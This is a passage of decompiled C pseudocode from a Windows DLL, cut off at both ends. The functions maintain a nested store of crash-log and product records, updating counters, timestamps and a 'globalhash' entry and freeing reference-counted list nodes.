        *piVar1 = *piVar1 + 1;
        UNLOCK();
      }
      pwVar11 = L"prodver";
      pwVar10 = L"product";
      local_8._0_1_ = 0xc;
      local_38 = piVar1;
      FUN_1003d2c0(L"crashlog");
      FUN_1003d2c0(pwVar10);
      FUN_1003d2c0(pwVar11);
      puVar2 = (undefined4 *)FUN_1003d440();
      local_3c = (int *)*puVar2;
      if (local_3c != (int *)0x0) {
        LOCK();
        *local_3c = *local_3c + 1;
        UNLOCK();
      }
      if (((piVar1 != (int *)0x0) && (piVar1 != (int *)0xfffffff4)) &&
         ((local_3c != (int *)0x0 && (local_3c != (int *)0xfffffff4)))) {
        FUN_1000ad00(&DAT_10088c90,0xffffffff);
        FUN_1000ad40(&local_3c);
        FUN_1000ad00(&DAT_10087c58,0xffffffff);
        local_8 = CONCAT31(local_8._1_3_,0xf);
        FUN_1000ad40(&local_50);
        pwVar10 = L"products";
        uVar8 = 0x10038c29;
        iVar4 = FUN_1003d2a0(L"products");
        if (iVar4 == 0) {
          FUN_1003d490(L"products",uVar8,pwVar10);
        }
        iVar4 = FUN_1003d2a0(L"products");
        if (iVar4 != 0) {
          uVar8 = FUN_1000adf0();
          FUN_1003d2c0(L"products");
          uVar9 = 0x10038c6c;
          iVar4 = FUN_1003d2a0(uVar8);
          if (iVar4 == 0) {
            uVar5 = FUN_1000adf0();
            FUN_1003d2c0(L"products");
            FUN_1003d490(uVar5,uVar9,uVar8);
          }
          uVar8 = FUN_1000adf0();
          FUN_1003d2c0(L"products");
          iVar4 = FUN_1003d2a0(uVar8);
          if (iVar4 != 0) {
            uVar8 = FUN_1000adf0();
            uVar9 = FUN_1000adf0(uVar8);
            FUN_1003d2c0(L"products");
            FUN_1003d2c0(uVar9);
            uVar9 = 0x10038cdf;
            iVar4 = FUN_1003d2a0(uVar8);
            if (iVar4 == 0) {
              uVar5 = FUN_1000adf0();
              uVar6 = FUN_1000adf0(uVar5);
              FUN_1003d2c0(L"products");
              FUN_1003d2c0(uVar6);
              FUN_1003d490(uVar5,uVar9,uVar8);
            }
            uVar8 = FUN_1000adf0();
            uVar9 = FUN_1000adf0(uVar8);
            FUN_1003d2c0(L"products");
            FUN_1003d2c0(uVar9);
            iVar4 = FUN_1003d2a0(uVar8);
            if (iVar4 != 0) {
              uVar8 = FUN_1000adf0();
              uVar9 = FUN_1000adf0(uVar8);
              uVar5 = FUN_1000adf0(uVar9);
              FUN_1003d2c0(L"products");
              FUN_1003d2c0(uVar5);
              FUN_1003d2c0(uVar9);
              uVar9 = 0x10038d82;
              iVar4 = FUN_1003d2a0(uVar8);
              if (iVar4 == 0) {
                uVar5 = FUN_1000adf0();
                uVar6 = FUN_1000adf0(uVar5);
                uVar7 = FUN_1000adf0(uVar6);
                FUN_1003d2c0(L"products");
                FUN_1003d2c0(uVar7);
                FUN_1003d2c0(uVar6);
                FUN_1003d490(uVar5,uVar9,uVar8);
              }
              uVar8 = FUN_1000adf0();
              uVar9 = FUN_1000adf0(uVar8);
              uVar5 = FUN_1000adf0(uVar9);
              FUN_1003d2c0(L"products");
              FUN_1003d2c0(uVar5);
              FUN_1003d2c0(uVar9);
              iVar4 = FUN_1003d2a0(uVar8);
              if (iVar4 != 0) {
                uVar8 = FUN_1000adf0();
                uVar9 = FUN_1000adf0(uVar8);
                uVar5 = FUN_1000adf0(uVar9);
                FUN_1003d2c0(L"products");
                FUN_1003d2c0(uVar5);
                FUN_1003d2c0(uVar9);
                FUN_1003d2c0(uVar8);
                if ((*(int *)(local_34 + 0x48) != 0) &&
                   (iVar4 = FUN_1003d800(L"forced"), iVar4 == 0)) {
                  puVar2 = (undefined4 *)FUN_1003d650(L"forced");
                  uVar8 = FUN_1000bdd0(&DAT_10088cd8,extraout_ECX);
                  *puVar2 = uVar8;
                }
                piVar1 = local_30;
                if (param_3 == 1) {
                  pwVar10 = L"counter";
                  uVar8 = 0x10038e95;
                  iVar4 = FUN_1003d2a0(L"counter");
                  if (iVar4 == 0) {
                    FUN_1003d490(L"counter",uVar8,pwVar10);
                    FUN_1003d2c0(L"counter");
                    puVar2 = (undefined4 *)FUN_1003d440();
                    uVar8 = FUN_1000bdd0(&DAT_10088cf0,extraout_ECX_00);
                    *puVar2 = uVar8;
                  }
                  uVar8 = 0x10038ed8;
                  FUN_1003d2c0(L"counter");
                  uVar9 = 0x10038edf;
                  puVar2 = (undefined4 *)FUN_1003d440();
                  iVar4 = FUN_10039b90(uVar8,uVar9);
                  iVar4 = iVar4 + 1;
                  uVar8 = extraout_ECX_01;
                  uVar9 = FUN_10039c20(iVar4,extraout_ECX_01);
                  *puVar2 = uVar9;
                  local_4c[0] = (int *)FUN_1003d490(L"timestamp",iVar4,uVar8);
                  pwVar11 = L"date";
                  pwVar10 = L"when";
                  FUN_1003d2c0(L"crashlog");
                  FUN_1003d2c0(pwVar10);
                  FUN_1003d2c0(pwVar11);
                  uVar8 = FUN_1003d440();
                  FUN_1000ace0(uVar8);
                  local_2c = 0;
                  local_8._0_1_ = 0x11;
                  local_28 = 0;
                  uStack_24 = 0;
                  uStack_20 = 0;
                  uStack_1c = 0;
                  FUN_105ab0e5(&local_28);
                  FUN_1000c520(&local_2c);
                  local_30 = (int *)0x0;
                  local_8 = CONCAT31(local_8._1_3_,0x12);
                  if ((local_2c == 0) || (*(int *)(local_2c + 8) == 0)) {
                    FUN_1001ee80(&local_2c,L"%04d",local_28 & 0xffff);
                  }
                  FUN_10010440(local_2c);
                  local_30 = (int *)FUN_1000bfa0(&DAT_10083be4,0xffffffff);
                  FUN_1000b610();
                  FUN_1000c520(&local_2c);
                  if ((local_2c == 0) || (*(int *)(local_2c + 8) == 0)) {
                    FUN_1001ee80(&local_2c,L"%02d",local_28 >> 0x10);
                  }
                  if ((local_2c != 0) && (*(int *)(local_2c + 8) == 1)) {
                    local_30 = (int *)FUN_1000bfa0(&DAT_10088cf0,0xffffffff);
                  }
                  FUN_1000ad40(&local_2c);
                  local_30 = (int *)FUN_1000bfa0(&DAT_10083be4,0xffffffff);
                  FUN_1000b610();
                  FUN_1000c520(&local_2c);
                  if ((local_2c == 0) || (*(int *)(local_2c + 8) == 0)) {
                    FUN_1001ee80(&local_2c,L"%02d",uStack_24 >> 0x10);
                  }
                  if ((local_2c != 0) && (*(int *)(local_2c + 8) == 1)) {
                    local_30 = (int *)FUN_1000bfa0(&DAT_10088cf0,0xffffffff);
                  }
                  FUN_1000ad40(&local_2c);
                  local_30 = (int *)FUN_1000bfa0(&DAT_10088d4c,0xffffffff);
                  pwVar11 = L"time";
                  pwVar10 = L"when";
                  FUN_1003d2c0(L"crashlog");
                  FUN_1003d2c0(pwVar10);
                  FUN_1003d2c0(pwVar11);
                  puVar2 = (undefined4 *)FUN_1003d440();
                  local_34 = FUN_10010440(*puVar2);
                  FUN_1000b610();
                  FUN_1000c520(&local_2c);
                  if ((local_2c == 0) || (*(int *)(local_2c + 8) == 0)) {
                    FUN_1001ee80(&local_2c,L"%02d",uStack_20 & 0xffff);
                  }
                  if ((local_2c != 0) && (*(int *)(local_2c + 8) == 1)) {
                    local_30 = (int *)FUN_1000bfa0(&DAT_10088cf0,0xffffffff);
                  }
                  FUN_1000ad40(&local_2c);
                  local_30 = (int *)FUN_1000bfa0(&DAT_10083824,0xffffffff);
                  FUN_1000b610();
                  FUN_1000c520(&local_2c);
                  if ((local_2c == 0) || (*(int *)(local_2c + 8) == 0)) {
                    FUN_1001ee80(&local_2c,L"%02d",uStack_20 >> 0x10);
                  }
                  if ((local_2c != 0) && (*(int *)(local_2c + 8) == 1)) {
                    local_30 = (int *)FUN_1000bfa0(&DAT_10088cf0,0xffffffff);
                  }
                  FUN_1000ad40(&local_2c);
                  local_30 = (int *)FUN_1000bfa0(&DAT_10083824,0xffffffff);
                  FUN_1000b610();
                  FUN_1000c520(&local_2c);
                  if ((local_2c == 0) || (*(int *)(local_2c + 8) == 0)) {
                    FUN_1001ee80(&local_2c,L"%02d",uStack_1c & 0xffff);
                  }
                  if ((local_2c != 0) && (*(int *)(local_2c + 8) == 1)) {
                    local_30 = (int *)FUN_1000bfa0(&DAT_10088cf0,0xffffffff);
                  }
                  FUN_1000ad40(&local_2c);
                  puVar2 = (undefined4 *)FUN_1003d440();
                  uVar8 = FUN_10010440(local_30);
                  *puVar2 = uVar8;
                  iVar4 = FUN_1003d800(L"globalhash");
                  if (iVar4 != 0) {
                    FUN_1003d650(L"globalhash");
                  }
                  FUN_10006f30();
                  FUN_10006f30();
                  FUN_10006f30();
                }
                else if (param_3 == 2) {
                  if (local_30 != (int *)0x0) {
                    iVar4 = FUN_1003d800(L"globalhash");
                    if (iVar4 == 0) {
                      if (*piVar1 == 0) {
                        local_34 = 0;
                      }
                      else {
                        local_34 = *piVar1 + 0xc;
                      }
                      puVar2 = (undefined4 *)FUN_1003d650(L"globalhash");
                      uVar8 = FUN_1000bdd0(local_34,extraout_ECX_02);
                      *puVar2 = uVar8;
                      FUN_1003d8b0();
                      goto LAB_10039319;
                    }
                    FUN_1003d650(L"globalhash");
                  }
                  FUN_1003d8b0();
                }
              }
            }
          }
        }
LAB_10039319:
        FUN_10006f30();
        FUN_10006f30();
        FUN_10006f30();
        FUN_10006f30();
        FUN_10006f30();
        local_8 = CONCAT31(local_8._1_3_,7);
        FUN_1003d1f0();
        goto LAB_100393fa;
      }
      FUN_10006f30();
      FUN_10006f30();
      FUN_10006f30();
    }
  }
  local_8 = CONCAT31(local_8._1_3_,7);
  FUN_1003d1f0();
LAB_100393fa:
  if (local_54 != (int *)0x0) {
    LOCK();
    iVar4 = *local_54;
    *local_54 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_54);
    }
  }
  if (local_58 != (int *)0x0) {
    LOCK();
    iVar4 = *local_58;
    *local_58 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_58);
    }
  }
  if (local_44 != (int *)0x0) {
    LOCK();
    iVar4 = *local_44;
    *local_44 = *local_44 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_44);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10039470 */

void __fastcall FUN_10039470(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 0xc);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 8);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 4);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_100394d0 */

void __fastcall FUN_100394d0(int param_1)

{
  int iVar1;
  ushort uVar2;
  code *pcVar3;
  uint uVar4;
  int iVar5;
  ushort *puVar6;
  int *piVar7;
  int *piVar8;
  int *extraout_ECX;
  undefined **ppuVar9;
  int *extraout_ECX_00;
  int *extraout_ECX_01;
  ushort *puVar10;
  int *piVar11;
  int *piVar12;
  bool bVar13;
  int *local_54;
  int *local_50;
  int *local_4c;
  int local_48;
  undefined4 local_38;
  int local_34;
  int local_30;
  int *local_2c;
  ushort *local_28;
  int local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076ff0;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (((*(int *)(param_1 + 0x34) != 0) && (param_1 != -4)) &&
     (local_30 = param_1, iVar5 = FUN_1003d2c0(L"products"), iVar5 != 0)) {
    local_34 = FUN_1003d2c0(L"products");
    piVar12 = (int *)**(int **)(*(int *)(local_34 + 0x30) + 4);
    if (piVar12 != *(int **)(*(int *)(local_34 + 0x30) + 4)) {
      local_38 = 0;
      do {
        local_48 = 0;
        local_18 = piVar12;
        local_4c = (int *)FUN_10018da0(0,0);
        local_8 = 0;
        FUN_10039bd0(uVar4);
        local_8._0_1_ = 1;
        piVar11 = (int *)**(int **)(piVar12[2] + 4);
        piVar8 = extraout_ECX;
        if (piVar11 != *(int **)(piVar12[2] + 4)) {
          do {
            piVar12 = *(int **)piVar11[2];
            if (piVar12 != (int *)0x0) {
              LOCK();
              *piVar12 = *piVar12 + 1;
              UNLOCK();
            }
            local_24 = 0;
            local_1c = piVar12;
            if ((piVar12 != (int *)0x0) && (piVar12 != (int *)0xfffffff4)) {
              local_20 = (int *)0x0;
              local_8._0_1_ = 3;
              iVar5 = FUN_1000c520(&local_20);
              piVar8 = local_20;
              if (iVar5 != 0) {
                if ((local_20 == (int *)0x0) ||
                   (ppuVar9 = (undefined **)(local_20 + 3), ppuVar9 == (undefined **)0x0)) {
                  ppuVar9 = &PTR_10083554;
                }
                iVar5 = FUN_1004b770(ppuVar9);
                if (&stack0x00000000 != (undefined1 *)0x3c) {
                  local_24 = iVar5;
                }
              }
              if (piVar8 != (int *)0x0) {
                LOCK();
                iVar5 = *piVar8;
                *piVar8 = iVar5 + -1;
                UNLOCK();
                if (iVar5 + -1 < 0) {
                  FUN_100579ee(piVar8);
                }
              }
            }
            local_28 = (ushort *)0x0;
            if ((piVar12 != (int *)0x0) && (piVar12 != (int *)0xfffffff4)) {
              local_20 = (int *)0x0;
              local_8._0_1_ = 4;
              iVar5 = FUN_1000c520(&local_20);
              piVar8 = local_20;
              if (iVar5 != 0) {
                if ((local_20 == (int *)0x0) ||
                   (ppuVar9 = (undefined **)(local_20 + 3), ppuVar9 == (undefined **)0x0)) {
                  ppuVar9 = &PTR_10083554;
                }
                puVar6 = (ushort *)FUN_1004b770(ppuVar9);
                if (&stack0x00000000 != (undefined1 *)0x40) {
                  local_28 = puVar6;
                }
              }
              if (piVar8 != (int *)0x0) {
                LOCK();
                iVar5 = *piVar8;
                *piVar8 = iVar5 + -1;
                UNLOCK();
                if (iVar5 + -1 < 0) {
                  FUN_100579ee(piVar8);
                }
              }
            }
            local_2c = (int *)0x0;
            if ((piVar12 != (int *)0x0) && (piVar12 != (int *)0xfffffff4)) {
              local_20 = (int *)0x0;
              local_8._0_1_ = 5;
              iVar5 = FUN_1000c520(&local_20);
              piVar8 = local_20;
              if (iVar5 != 0) {
                if ((local_20 == (int *)0x0) ||
                   (ppuVar9 = (undefined **)(local_20 + 3), ppuVar9 == (undefined **)0x0)) {
                  ppuVar9 = &PTR_10083554;
                }
                piVar7 = (int *)FUN_1004b770(ppuVar9);
                if (&stack0x00000000 != (undefined1 *)0x44) {
                  local_2c = piVar7;
                }
              }
              if (piVar8 != (int *)0x0) {
                LOCK();
                iVar5 = *piVar8;
                *piVar8 = iVar5 + -1;
                UNLOCK();
                if (iVar5 + -1 < 0) {
                  FUN_100579ee(piVar8);
                }
              }
            }
            piVar8 = local_4c;
            local_54 = local_2c + (int)(local_28 + local_24 * 0x80) * 0x4000;
            if (piVar12 != (int *)0x0) {
              LOCK();
              *piVar12 = *piVar12 + 1;
              UNLOCK();
            }
            local_8 = CONCAT31(local_8._1_3_,6);
            local_50 = piVar12;
            iVar5 = FUN_1003a080(local_4c,local_4c[1],&local_54);
            if (local_48 == 0xffffffe) {
              FUN_10056a6a("list<T> too long");
              pcVar3 = (code *)swi(3);
              (*pcVar3)();
              return;
            }
            piVar8[1] = iVar5;
            local_48 = local_48 + 1;
            piVar8 = *(int **)(iVar5 + 4);
            *piVar8 = iVar5;
            if (piVar12 != (int *)0x0) {
              LOCK();
              iVar5 = *piVar12;
              *piVar12 = iVar5 + -1;
              UNLOCK();
              if (iVar5 + -1 < 0) {
                FUN_100579ee(piVar12);
                piVar8 = extraout_ECX_00;
              }
            }
            local_8._0_1_ = 1;
            if (piVar12 != (int *)0x0) {
              LOCK();
              iVar5 = *piVar12;
              *piVar12 = iVar5 + -1;
              UNLOCK();
              if (iVar5 + -1 < 0) {
                FUN_100579ee(piVar12);
                piVar8 = extraout_ECX_01;
              }
            }
            piVar11 = (int *)*piVar11;
          } while (piVar11 != (int *)*(int *)(local_18[2] + 4));
        }
        FUN_10039d10(piVar8);
        iVar5 = 0;
        piVar12 = (int *)*local_4c;
        piVar8 = (int *)piVar12[2];
        piVar11 = local_4c;
        local_2c = piVar8;
        if (piVar12 != local_4c) {
          do {
            if (piVar8 != (int *)piVar12[2]) {
              iVar5 = iVar5 + 1;
            }
            if (iVar5 < 1) {
              piVar7 = (int *)*piVar12;
            }
            else {
              piVar7 = (int *)*piVar12;
              local_48 = local_48 + -1;
              *(int **)piVar12[1] = piVar7;
              *(int *)(*piVar12 + 4) = piVar12[1];
              piVar8 = (int *)piVar12[3];
              if (piVar8 != (int *)0x0) {
                LOCK();
                iVar1 = *piVar8;
                *piVar8 = iVar1 + -1;
                UNLOCK();
                if (iVar1 + -1 < 0) {
                  FUN_100579ee(piVar8);
                }
              }
              thunk_FUN_100579ee(piVar12);
              piVar8 = local_2c;
              piVar11 = local_4c;
            }
            piVar12 = piVar7;
          } while (piVar7 != piVar11);
        }
        piVar12 = (int *)**(int **)(local_18[2] + 4);
        if (piVar12 != *(int **)(local_18[2] + 4)) {
          do {
            piVar8 = *(int **)piVar12[2];
            if (piVar8 != (int *)0x0) {
              LOCK();
              *piVar8 = *piVar8 + 1;
              UNLOCK();
            }
            local_8._0_1_ = 7;
            piVar7 = (int *)*piVar11;
            local_2c = piVar8;
            if (piVar7 != piVar11) {
              local_28 = (ushort *)FUN_1000adf0();
              do {
                if ((piVar7[3] == 0) ||
                   (puVar6 = (ushort *)(piVar7[3] + 0xc), puVar6 == (ushort *)0x0)) {
                  if ((local_28 == (ushort *)0x0) || (*local_28 == 0)) goto LAB_10039892;
                }
                else {
                  puVar10 = local_28;
                  if (local_28 == (ushort *)0x0) {
                    bVar13 = *puVar6 == 0;
                  }
                  else {
                    do {
                      uVar2 = *puVar6;
                      bVar13 = uVar2 < *puVar10;
                      if (uVar2 != *puVar10) {
LAB_1003987b:
                        bVar13 = (-(uint)bVar13 | 1) == 0;
                        goto LAB_1003988b;
                      }
                      if (uVar2 == 0) break;
                      uVar2 = puVar6[1];
                      bVar13 = uVar2 < puVar10[1];
                      if (uVar2 != puVar10[1]) goto LAB_1003987b;
                      puVar6 = puVar6 + 2;
                      puVar10 = puVar10 + 2;
                    } while (uVar2 != 0);
                    bVar13 = true;
                  }
LAB_1003988b:
                  if (bVar13) {
LAB_10039892:
                    piVar7 = (int *)*piVar12;
                    goto LAB_100398dc;
                  }
                }
                piVar7 = (int *)*piVar7;
              } while (piVar7 != local_4c);
            }
            *(undefined4 *)(local_30 + 0x30) = 0;
            piVar7 = (int *)*piVar12;
            iVar5 = local_18[2];
            *(int **)piVar12[1] = piVar7;
            *(int *)(*piVar12 + 4) = piVar12[1];
            *(int *)(iVar5 + 8) = *(int *)(iVar5 + 8) + -1;
            FUN_1003c940();
            thunk_FUN_100579ee(piVar12);
LAB_100398dc:
            if (piVar8 != (int *)0x0) {
              LOCK();
              iVar5 = *piVar8;
              *piVar8 = iVar5 + -1;
              UNLOCK();
              if (iVar5 + -1 < 0) {
                FUN_100579ee(piVar8);
              }
            }
            piVar11 = local_4c;
            piVar12 = piVar7;
          } while (piVar7 != *(int **)(local_18[2] + 4));
        }
        piVar12 = local_18;
        local_8 = 0xffffffff;
        piVar8 = (int *)*piVar11;
        *piVar11 = (int)piVar11;
        piVar11[1] = (int)piVar11;
        local_48 = 0;
        if (piVar8 != piVar11) {
          do {
            piVar11 = (int *)piVar8[3];
            piVar7 = (int *)*piVar8;
            if (piVar11 != (int *)0x0) {
              LOCK();
              iVar5 = *piVar11;
              *piVar11 = iVar5 + -1;
              UNLOCK();
              if (iVar5 + -1 < 0) {
                FUN_100579ee(piVar11);
              }
            }
            thunk_FUN_100579ee(piVar8);
            piVar11 = local_4c;
            piVar8 = piVar7;
          } while (piVar7 != local_4c);
        }
        thunk_FUN_100579ee(piVar11);
        piVar12 = (int *)*piVar12;
      } while (piVar12 != (int *)*(int *)(*(int *)(local_34 + 0x30) + 4));
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10039990 */

int __fastcall FUN_10039990(int param_1)

{
  wchar_t wVar1;
  int iVar2;
  int *piVar3;
  wchar_t *pwVar4;
  uint uVar5;
  undefined4 uVar6;
  int *piVar7;
  wchar_t *pwVar8;
  undefined **ppuVar9;
  int *piVar10;
  int *piVar11;
  int iVar12;
  int *piVar13;
  int *piVar14;
  bool bVar15;
  int local_10;
  
  iVar12 = 0;
  local_10 = 0;
  if (*(int *)(param_1 + 0x34) == 0) {
    return 0;
  }
  if ((param_1 != -4) && (iVar2 = FUN_1003d2c0(L"products"), iVar2 != 0)) {
    iVar2 = FUN_1003d2c0(L"products");
    piVar3 = *(int **)(*(int *)(iVar2 + 0x30) + 4);
    piVar7 = (int *)*piVar3;
    if (piVar7 != piVar3) {
      do {
        piVar3 = (int *)**(int **)(piVar7[2] + 4);
        if (piVar3 != *(int **)(piVar7[2] + 4)) {
          do {
            piVar13 = (int *)**(int **)(piVar3[2] + 4);
            if (piVar13 != *(int **)(piVar3[2] + 4)) {
              do {
                piVar11 = (int *)**(int **)(piVar13[2] + 4);
                if (piVar11 != *(int **)(piVar13[2] + 4)) {
                  do {
                    iVar12 = *(int *)piVar11[2];
                    if ((iVar12 != 0) &&
                       (pwVar4 = (wchar_t *)(iVar12 + 0xc), pwVar4 != (wchar_t *)0x0)) {
                      pwVar8 = L"counter";
                      do {
                        wVar1 = *pwVar4;
                        bVar15 = (ushort)wVar1 < (ushort)*pwVar8;
                        if (wVar1 != *pwVar8) {
LAB_10039a66:
                          uVar5 = -(uint)bVar15 | 1;
                          goto LAB_10039a6b;
                        }
                        if (wVar1 == L'\0') break;
                        wVar1 = pwVar4[1];
                        bVar15 = (ushort)wVar1 < (ushort)pwVar8[1];
                        if (wVar1 != pwVar8[1]) goto LAB_10039a66;
                        pwVar4 = pwVar4 + 2;
                        pwVar8 = pwVar8 + 2;
                      } while (wVar1 != L'\0');
                      uVar5 = 0;
LAB_10039a6b:
                      if (uVar5 == 0) {
                        iVar12 = ((int *)piVar11[2])[7];
                        if ((iVar12 == 0) ||
                           (ppuVar9 = (undefined **)(iVar12 + 0xc), ppuVar9 == (undefined **)0x0)) {
                          ppuVar9 = &PTR_10083554;
                        }
                        FUN_1004b770(ppuVar9);
                        iVar12 = piVar11[2];
                        uVar6 = FUN_1000bdd0(&DAT_10088cf0,ppuVar9);
                        *(undefined4 *)(iVar12 + 0x1c) = uVar6;
                      }
                    }
                    piVar11 = (int *)*piVar11;
                  } while (piVar11 != (int *)*(int *)(piVar13[2] + 4));
                }
                piVar10 = (int *)(piVar13[2] + 4);
                piVar11 = *(int **)*piVar10;
                if (piVar11 != (int *)*piVar10) {
                  do {
                    if ((*(int *)piVar11[2] == 0) ||
                       (pwVar4 = (wchar_t *)(*(int *)piVar11[2] + 0xc), pwVar4 == (wchar_t *)0x0)) {
LAB_10039b38:
                      piVar14 = (int *)*piVar11;
                    }
                    else {
                      pwVar8 = L"timestamp";
                      do {
                        wVar1 = *pwVar4;
                        bVar15 = (ushort)wVar1 < (ushort)*pwVar8;
                        if (wVar1 != *pwVar8) {
LAB_10039afd:
                          uVar5 = -(uint)bVar15 | 1;
                          goto LAB_10039b02;
                        }
                        if (wVar1 == L'\0') break;
                        wVar1 = pwVar4[1];
                        bVar15 = (ushort)wVar1 < (ushort)pwVar8[1];
                        if (wVar1 != pwVar8[1]) goto LAB_10039afd;
                        pwVar4 = pwVar4 + 2;
                        pwVar8 = pwVar8 + 2;
                      } while (wVar1 != L'\0');
                      uVar5 = 0;
LAB_10039b02:
                      if (uVar5 != 0) goto LAB_10039b38;
                      piVar14 = (int *)*piVar11;
                      local_10 = local_10 + 1;
                      *(int **)piVar11[1] = piVar14;
                      *(int *)(*piVar11 + 4) = piVar11[1];
                      piVar10[1] = piVar10[1] + -1;
                      FUN_1003c940();
                      thunk_FUN_100579ee(piVar11);
                    }
                    piVar10 = (int *)(piVar13[2] + 4);
                    piVar11 = piVar14;
                  } while (piVar14 != (int *)*piVar10);
                }
                piVar13 = (int *)*piVar13;
              } while (piVar13 != (int *)*(int *)(piVar3[2] + 4));
            }
            piVar3 = (int *)*piVar3;
          } while (piVar3 != (int *)*(int *)(piVar7[2] + 4));
        }
        piVar7 = (int *)*piVar7;
        iVar12 = local_10;
      } while (piVar7 != (int *)*(int *)(*(int *)(iVar2 + 0x30) + 4));
    }
  }
  return iVar12;
}



/* Function: FUN_10039b90 */

void __fastcall FUN_10039b90(int *param_1)

{
  undefined **ppuVar1;
  
  if ((*param_1 == 0) || (ppuVar1 = (undefined **)(*param_1 + 0xc), ppuVar1 == (undefined **)0x0)) {
    ppuVar1 = &PTR_10083554;
  }
  FUN_1004b770(ppuVar1);
  return;
}



/* Function: FUN_10039bb0 */

void __fastcall FUN_10039bb0(undefined4 *param_1)

{
  FUN_10039bd0();
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10039bd0 */

void __fastcall FUN_10039bd0(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  
  piVar2 = (int *)*param_1;
  piVar4 = (int *)*piVar2;
  *piVar2 = (int)piVar2;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar4 != (int *)*param_1) {
    do {
      piVar2 = (int *)piVar4[3];
      piVar3 = (int *)*piVar4;
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar2;
        *piVar2 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      thunk_FUN_100579ee(piVar4);
      piVar4 = piVar3;
    } while (piVar3 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_10039c20 */

int * __fastcall FUN_10039c20(int *param_1)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined2 *)(param_1 + 3) = 0;
      uVar4 = param_1[1];
      uVar1 = FUN_1004bba0(uVar4,10);
      if (uVar1 < uVar4) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_10010290(uVar1);
      if (piVar2 == (int *)0x0) {
        return (int *)0x0;
      }
      goto LAB_10039c7b;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  iVar3 = FUN_1004bba0(0,10);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar4 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar4 = iVar3 + 1U;
    }
    uVar4 = uVar4 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar4 * 2 + 0xe);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
LAB_10039c7b:
      iVar3 = FUN_1004bba0(piVar2[1],10);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_10039d10 */

/* WARNING: Type propagation algorithm not settling */

void __fastcall FUN_10039d10(int **param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  code *pcVar6;
  uint uVar7;
  int *piVar8;
  int **ppiVar9;
  int **extraout_ECX;
  int iVar10;
  uint uVar11;
  undefined1 *puVar12;
  uint local_fc;
  uint local_f8;
  int *local_f4;
  int *local_f0 [4];
  undefined1 local_e0 [200];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077031;
  local_10 = ExceptionList;
  uVar7 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_18 = uVar7;
  if ((int *)0x1 < param_1[1]) {
    local_f0[1] = (int *)0x0;
    local_f0[0] = (int *)0x0;
    piVar8 = (int *)FUN_10018da0(0,0);
    local_8 = 0;
    local_f4 = piVar8;
    FUN_1005849f(local_f0 + 2,8,0x1a,FUN_10022f10,FUN_10039bb0);
    local_8 = CONCAT31(local_8._1_3_,1);
    local_fc = 0;
    piVar1 = param_1[1];
    piVar4 = (int *)0x0;
    while (piVar1 != (int *)0x0) {
      iVar10 = *piVar8;
      piVar1 = (int *)**param_1;
      iVar2 = *piVar1;
      if (&local_f4 != param_1) {
        if (piVar4 == (int *)0xffffffe) {
          FUN_10056a6a("list<T> too long",uVar7);
          pcVar6 = (code *)swi(3);
          (*pcVar6)();
          return;
        }
        local_f0[1] = (int *)((int)piVar4 + 1);
        local_f0[0] = (int *)((int)piVar4 + 1);
        param_1[1] = (int *)((int)param_1[1] + -1);
      }
      *(int *)piVar1[1] = iVar2;
      **(int **)(iVar2 + 4) = iVar10;
      **(int **)(iVar10 + 4) = (int)piVar1;
      iVar3 = *(int *)(iVar10 + 4);
      *(undefined4 *)(iVar10 + 4) = *(undefined4 *)(iVar2 + 4);
      *(int *)(iVar2 + 4) = piVar1[1];
      piVar1[1] = iVar3;
      uVar11 = 0;
      local_f8 = 0;
